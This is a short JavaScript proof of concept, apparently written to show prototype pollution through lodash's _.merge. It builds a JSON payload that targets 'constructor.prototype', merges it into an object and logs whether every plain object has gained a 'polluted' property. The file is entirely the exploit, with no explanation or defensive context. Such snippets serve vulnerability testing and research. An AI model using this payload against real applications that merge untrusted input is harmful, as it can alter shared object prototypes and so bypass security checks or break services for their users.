var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const _ = require('lodash');
let payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
console.log({}.polluted);
_.merge(obj, payload);
console.log({}.polluted);